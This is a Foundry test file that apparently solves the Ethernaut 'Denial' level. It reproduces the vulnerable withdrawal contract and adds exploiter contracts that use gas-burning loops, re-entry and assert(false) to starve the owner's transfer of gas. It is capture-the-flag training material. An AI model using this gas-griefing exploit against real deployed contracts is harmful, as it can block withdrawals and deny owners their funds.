// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {HuffDeployer} from "@foundry-huff/HuffDeployer.sol";

/* Jumping this level rn because of 63/64 gas rule */
contract DenialTest1 is Test {
    Denial denial;
    string public constant DENIAL_HUFF_LOCATION = "Denial";

    function setUp() public {
        denial = new Denial();
        deal(address(denial), 1e15);
        // denial = Denial(payable(0x6185Be5dF343C299f9424B96A22296A5D4adcb10));
    }

    function test_huff() public {
	    address exploiter = HuffDeployer.config().deploy(DENIAL_HUFF_LOCATION);
        denial.setWithdrawPartner(exploiter);
        denial.withdraw();
    }

    function test_loop() public {
        address exploiter = address(new ExploiterLoop(address(denial), address(new ExploiterAssert())));
        denial.withdraw();
    }
}

contract ExploiterLoop {
    IDenial denial;    
    address exploiter;

    constructor(address _denial, address _exploiter) {
        denial = IDenial(_denial);
        exploiter = _exploiter;
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (gasleft() > 112318) {}
        denial.setWithdrawPartner(exploiter);
        denial.withdraw();
    }
}

contract ExploiterAssert {
    fallback() external payable {
        assert(false);
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    event Gas(uint256);

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        emit Gas(gasleft());
        partner.call{value: amountToSend}("");
        emit Gas(gasleft());
        payable(owner).transfer(amountToSend);
        emit Gas(gasleft());
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        emit Gas(gasleft());
        withdrawPartnerBalances[partner] += amountToSend;
        emit Gas(gasleft());
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}